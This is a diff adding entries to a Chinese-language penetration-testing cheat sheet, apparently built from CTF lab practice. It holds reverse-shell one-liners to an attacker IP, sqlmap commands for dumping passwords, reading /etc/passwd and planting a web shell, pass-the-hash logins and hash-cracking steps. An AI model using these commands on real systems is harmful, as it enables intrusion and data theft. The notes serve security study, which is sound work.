@@ -10,6 +10,7 @@
     - [一些少见的提权方式](#一些少见的提权方式)
   - [工具使用](#工具使用)
     - [evil-winrm](#evil-winrm)
+    - [impacket](#impacket)
     - [john the ripper](#john-the-ripper)
     - [remmina](#remmina)
     - [Nmap](#nmap)
@@ -25,10 +26,12 @@
     - [stegseek](#stegseek)
     - [snort](#snort)
     - [powershell](#powershell)
+    - [xfreerdp](#xfreerdp)
     - [objdump](#objdump)
     - [radare2](#radare2)
   - [一些重要的命令](#一些重要的命令)
     - [curl命令](#curl命令)
+    - [download](#download)
     - [sc](#sc)
     - [copy](#copy)
     - [find](#find)
@@ -39,6 +42,7 @@
     - [mysql](#mysql)
     - [mssql](#mssql)
     - [redis](#redis)
+    - [zip](#zip)
     - [other](#other)
   - [一些要记住的知识](#一些要记住的知识)
     - [弱密码](#弱密码)
@@ -47,7 +51,7 @@
     - [vHosts](#vhosts)
     - [编码生成命令](#编码生成命令)
     - [读取文件的命令](#读取文件的命令)
-    - [](#)
+    - [血的教训](#血的教训)
 ## WEB
 
 
@@ -74,6 +78,8 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/<攻击者ip>/1234 0>&1'");
 
 
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.21.44 1123 >/tmp/f
+
+
 
 ### 稳定shell
 
@@ -148,6 +154,14 @@ evil-winrm -i IP -u USERNAME -p PASSWORD
 
 evil-winrm -i 10.200.60.201 -u trevor.local -H 41cb324dee3768a2777a1d640b2808a8
 
+### impacket
+
+HTB起点靶机发现的，专门用来对付mssql(微软的数据库)
+
+
+
+
+
 ### john the ripper
 
 john [选项] [文件]  
@@ -156,7 +170,8 @@ unshadow passwd.txt shadow.txt
 
 >john自带的工具  
 
-gpg2john
+>gpg2john
+
 ``````
 gpg2john tryhackme.asc > keyhash
 john --wordlist= keyhash [解出pgp加密的密码]
@@ -164,11 +179,19 @@ gpg --import tryhackme.asc
 gpg --decrypt credential.pgp
 ``````
 
+>zip2john
+
+```
 zip2john
+```
 
-ssh2john:
+>ssh2john:
 
-ss
+如果输出不规范，可以打开源码复制源码内容，源码比较规范
+
+``````
+ss2john <ssh私钥文件> > hash.txt
+``````
 
 
 ### remmina
@@ -319,6 +342,35 @@ gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirbuster/directory-l
 
 sqlmap -u "URL"
 
+|命令	|描述|
+|:--:|:--:|
+|sqlmap -h |	查看基本帮助菜单|
+|sqlmap -hh	|查看高级帮助菜单
+|sqlmap -u "http://www.example.com/vuln.php?id=1" --batch	|在不询问用户输入的情况下运行SQLMap|
+|sqlmap 'http://www.example.com/' --data 'uid=1&name=test'	|SQLMap使用 POST 请求|
+|sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'	|指定带有星号的注入点的 POST 请求|
+|sqlmap -r req.txt	|将 HTTP 请求文件传递给SQLMap|
+|sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'	|指定 Cookie 标头|
+|sqlmap -u www.target.com --data='id=1' --method PUT	|指定 PUT 请求|
+|sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt	|将流量存储到输出文件|
+|sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch	|指定详细级别|
+|sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"	|指定前缀或后缀|
+|sqlmap -u www.example.com/?id=1 -v 3 --level=5	|指定级别和风险|
+|sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba	|基本数据库枚举|
+|sqlmap -u "http://www.example.com/?id=1" --tables -D testdb	|表枚举|
+|sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname	|表/行枚举|
+|sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"	|条件枚举|
+|sqlmap -u "http://www.example.com/?id=1" --schema	|数据库架构枚举|
+|sqlmap -u "http://www.example.com/?id=1" --search -T user	|搜索数据|
+|sqlmap -u "http://www.example.com/?id=1" --passwords --batch	|密码枚举和破解|
+|sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"	|反CSRF令牌绕过|
+|sqlmap --list-tampers	|列出所有篡改脚本|
+|sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba	|检查 DBA 权限|
+|sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"	|读取本地文件|
+|sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"	|写入文件|
+|sqlmap -u "http://www.example.com/?id=1" --os-shell	|生成操作系统 shell|
+
+
 >其他参数
 
 参数|用法
@@ -432,6 +484,11 @@ Invoke-WebRequest -Uri https://example.com/path/to/file.txt -OutFile C:\path\to\
 
 如果不是powershell则要在前面加上powershell -c
 
+### xfreerdp
+
+xfreerdp /v:<IP> /u:<USRENAME> /p:<PASSWORD>
+
+
 ### objdump
 
 objdump -D FILE
@@ -490,6 +547,17 @@ curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City	删除条目
 
 -X 选取请求方式[POST PUT GET]
 
+### download
+
+linux:
+```
+wget http://IP:PORT/FILES
+```
+
+windows:
+```
+Invoke-WebRequest -Uri "http://IP:PORT/FILES" -OutFile "C:\FILES"
+```
 
 
 ### sc
@@ -525,6 +593,11 @@ find [目录路径] -type f -newerat [开始日期范围] ! -newerat [结束日�
 grep -iRl [目录路径/关键字]
 
 man find
+
+查找suid:
+``````
+find / -perm -u=s -type f 2>/dev/null
+``````
 
 ### ssh
 
@@ -588,9 +661,23 @@ get <KEY> 输出key的值
 
 keys * 输出所有的key
 
+### zip
 
+>zip
 
+压缩：  
+zip -r test.zip file
 
+解压：  
+unzip test.zip
+
+>rar
+
+压缩：  
+rar a -r test.rar file
+
+解压：
+unrar x test.rar
 
 ### other
 
@@ -688,4 +775,7 @@ gzip:压缩和解压缩的工具，zcat命令可以读取压缩文件的内容
 
 
 
-### 
+### 血的教训
+
+- Linux的文件系统一定要非常了解，以便于识别出在根目录的其他文件夹
+- 
